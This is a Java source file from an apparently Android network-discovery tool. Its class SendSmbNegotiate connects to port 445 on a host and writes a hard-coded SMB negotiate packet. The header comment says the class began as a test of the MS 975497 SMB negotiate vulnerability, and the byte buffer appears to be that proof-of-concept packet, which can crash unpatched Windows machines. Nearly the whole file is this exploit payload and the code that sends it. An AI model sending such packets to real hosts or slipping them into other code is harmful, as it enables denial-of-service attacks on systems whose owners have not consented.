/*
 * Copyright (C) 2009-2010 Aubort Jean-Baptiste (Rorist)
 * Licensed under GNU's GPL 2, see README
 */

/*
 ACKNOWLEDGE:
 This program was first to test MS 975497 SMB negotiate vuln, ported to java, to test against my own network.
 So there are still some traces of it in the code, and it could become a feature in the future..

 http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html
 */

package util.network.discovery.Network;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;

import android.util.Log;

public class SendSmbNegotiate implements Runnable {
    private final String TAG = "SendSmbNegociate";
    private final int[] buff = { 0x00, 0x00, 0x00, 0x90, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00,
            0x00, 0x00, 0x18, 0x53, 0xc8, 0x00, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0x00,
            0x02, 0x50, 0x43, 0x20, 0x4e, 0x45, 0x54, 0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52,
            0x4f, 0x47, 0x52, 0x41, 0x4d, 0x20, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x4c, 0x41, 0x4e,
            0x4d, 0x41, 0x4e, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77,
            0x73, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x57, 0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75,
            0x70, 0x73, 0x20, 0x33, 0x2e, 0x31, 0x61, 0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32,
            0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x32, 0x2e,
            0x31, 0x00, 0x02, 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00,
            0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00 };
    private final int TIMEOUT = 250;
    private final int PORT = 445;
    public InetAddress host = null;

    // public String message = null;

    public void run() {
        Socket s = new Socket();
        try {
            s.bind(null);
            s.connect(new InetSocketAddress(host, PORT), TIMEOUT);
            OutputStream out = s.getOutputStream();
            for (int b : buff) {
                out.write(b);
            }
            out.close();
            s.close();
        } catch (IOException e) {
            Log.e(TAG, e.getMessage());
        }
        // setMessage(host.getHostAddress() + " sent buffer");
    }
}
